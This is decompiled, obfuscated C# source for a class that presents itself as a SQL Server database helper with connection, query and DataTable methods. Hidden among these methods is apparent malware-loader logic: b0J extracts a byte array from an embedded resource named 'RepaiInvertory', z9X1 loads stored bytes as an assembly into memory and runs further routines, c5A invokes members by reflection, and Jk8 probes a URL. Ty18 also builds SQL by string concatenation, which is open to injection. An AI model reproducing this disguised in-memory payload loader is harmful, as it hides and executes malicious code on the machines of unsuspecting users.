using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Nz6;
using Wr1g;
using j5L;

namespace Gw6e;

public class m6G9
{
	protected SqlConnection SqlCon;

	protected SqlCommand SqlCom;

	protected SqlDataReader Sqldreader;

	protected SqlDataAdapter SqlDa;

	protected SqlCommandBuilder SqlComb;

	private string ConnectionString;

	public m6G9()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		ConnectionString = "Data Source=BK-PC;Initial Catalog=manager_ass;Integrated Security=True";
		SqlCon = new SqlConnection();
		SqlCon.set_ConnectionString(ConnectionString);
	}

	internal static bool Jk8(string g8G)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(g8G);
			webRequest.GetResponse();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return true;
	}

	public bool i7G()
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		bool result = default(bool);
		try
		{
			if (SqlCon.get_State() != ConnectionState.Open)
			{
				SqlCon.set_ConnectionString(ConnectionString);
				SqlCon.Open();
				result = true;
				return result;
			}
			result = false;
			return result;
		}
		catch (SqlException val)
		{
			ProjectData.SetProjectError((Exception)val);
			MessageBox.Show("Can not connect to database, please choose a database!", "Connect Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	protected bool Sd4()
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		//IL_002b: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (SqlCon.get_State() != 0)
			{
				SqlCon.Close();
				return true;
			}
			return false;
		}
		catch (SqlException val)
		{
			ProjectData.SetProjectError((Exception)val);
			SqlException val2 = val;
			Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Close Database");
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool Jm7(string Pp6, bool e2T = false)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		//IL_0031: Expected O, but got Unknown
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		bool result = default(bool);
		if (i7G())
		{
			try
			{
				SqlCom = new SqlCommand(Pp6, SqlCon);
				SqlCom.ExecuteNonQuery();
				return true;
			}
			catch (SqlException val)
			{
				ProjectData.SetProjectError((Exception)val);
				SqlException val2 = val;
				if (e2T)
				{
					Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Execute!");
				}
				result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			finally
			{
				Sd4();
				((Component)(object)SqlCom).Dispose();
			}
		}
		return result;
	}

	internal static byte[] b0J(string[] La1, int k5W)
	{
		checked
		{
			byte[] result = default(byte[]);
			try
			{
				string[] array = new string[La1.Length - 1 + 1];
				int num = La1.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						array[i] = La1[i].Replace(".resources", "");
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text == null)
					{
						continue;
					}
					try
					{
						ResourceManager resourceManager = new ResourceManager(text, (Assembly)x4PY.mDic["Ass"]);
						ResourceSet resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
						foreach (object item in resourceSet.OfType<object>())
						{
							DictionaryEntry dictionaryEntry = ((item != null) ? ((DictionaryEntry)item) : default(DictionaryEntry));
							if (Operators.ConditionalCompareObjectEqual(dictionaryEntry.Key, (object)"RepaiInvertory", false))
							{
								result = (byte[])dictionaryEntry.Value;
								return result;
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				return result;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public SqlDataReader Ys8(string Lx1)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		//IL_003c: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (i7G())
			{
				SqlCom = new SqlCommand(Lx1, SqlCon);
				Sqldreader = SqlCom.ExecuteReader();
			}
			return Sqldreader;
		}
		catch (SqlException val)
		{
			ProjectData.SetProjectError((Exception)val);
			SqlException val2 = val;
			Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get DataReader");
			SqlDataReader result = null;
			ProjectData.ClearProjectError();
			return result;
		}
		finally
		{
			Sd4();
			((Component)(object)SqlCom).Dispose();
		}
	}

	public object Rz8(string Re9)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		object result = null;
		try
		{
			if (i7G())
			{
				SqlCom = new SqlCommand(Re9, SqlCon);
				result = RuntimeHelpers.GetObjectValue(SqlCom.ExecuteScalar());
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)16, (object)"Get Scalar");
			ProjectData.ClearProjectError();
		}
		finally
		{
			Sd4();
			((Component)(object)SqlCom).Dispose();
		}
		return result;
	}

	public DataTable e4L(string z9G)
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_006c: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		string text = string.Empty;
		try
		{
			text = z9G.Substring(14);
			text = text.Substring(0, checked(text.IndexOf(" ") + 1));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		DataTable dataTable = new DataTable(text);
		SqlDa = new SqlDataAdapter(z9G, SqlCon);
		if (i7G())
		{
			try
			{
				((DbDataAdapter)(object)SqlDa).Fill(dataTable);
			}
			catch (SqlException val)
			{
				ProjectData.SetProjectError((Exception)val);
				SqlException val2 = val;
				Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get Datatable");
				ProjectData.ClearProjectError();
			}
			finally
			{
				Sd4();
				((Component)(object)SqlDa).Dispose();
			}
		}
		return dataTable;
	}

	public static string c5A(string j2W)
	{
		Type type = (Type)x4PY.mDic[x4PY.T];
		return Conversions.ToString(type.InvokeMember(j2W, BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, null, null, null));
	}

	public DataTable Ty18(string Kf3j, string Nj72)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		//IL_0047: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		DataTable dataTable = new DataTable(Kf3j);
		SqlDa = new SqlDataAdapter("Select * from " + Kf3j + " Where " + Nj72, SqlCon);
		if (i7G())
		{
			try
			{
				((DbDataAdapter)(object)SqlDa).Fill(dataTable);
			}
			catch (SqlException val)
			{
				ProjectData.SetProjectError((Exception)val);
				SqlException val2 = val;
				Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get DataTable");
				ProjectData.ClearProjectError();
			}
			finally
			{
				Sd4();
				((Component)(object)SqlDa).Dispose();
			}
		}
		return dataTable;
	}

	public bool Wo7n(string Dc48, DataTable Lk3p, bool Rt20 = false)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		SqlDa = new SqlDataAdapter();
		SqlDa.set_SelectCommand(new SqlCommand(Dc48, SqlCon));
		SqlComb = new SqlCommandBuilder(SqlDa);
		try
		{
			if (i7G())
			{
				((DbDataAdapter)(object)SqlDa).Update(Lk3p);
				return true;
			}
			return false;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			if (Rt20)
			{
				Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)16, (object)"Warning");
			}
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		finally
		{
			Sd4();
			((Component)(object)SqlDa).Dispose();
			((Component)(object)SqlComb).Dispose();
		}
	}

	internal static void z9X1()
	{
		Assembly value = Thread.GetDomain().Load((byte[])x4PY.mDic[x4PY.mArray]);
		x4PY.mDic.Add("Ass2", value);
		value = null;
		if (Ze1.Fm0())
		{
			x0R.Nx48();
		}
	}

	protected void Rc2y()
	{
		Sd4();
		GC.SuppressFinalize(this);
	}
}
